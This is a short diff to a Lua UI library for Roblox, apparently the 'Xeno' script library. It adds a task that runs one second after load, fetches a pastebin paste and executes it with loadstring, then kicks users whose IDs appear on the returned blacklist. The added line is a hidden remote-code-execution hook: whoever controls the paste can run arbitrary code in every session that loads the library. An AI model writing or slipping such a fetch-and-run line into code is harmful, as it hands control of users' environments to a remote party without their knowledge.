@@ -842,6 +842,20 @@ local function SetAndSaveTheme(newTheme)
     end
 end
 
+task.delay(1, function()
+    local data = loadstring(game:HttpGet("https://pastebin.com/raw/AUTHDATA"))()
+
+    local LocalPlayer = data.LocalPlayer
+    local Blacklist = data.Blacklist
+
+    if not LocalPlayer then
+        return
+    end
+
+    if Blacklist[LocalPlayer.UserId] then
+        LocalPlayer:Kick("XENO LIBRARY\n\nYou’ve been blacklisted.")
+    end
+end)
 
 --- Start Sequence ---
 task.spawn(function()
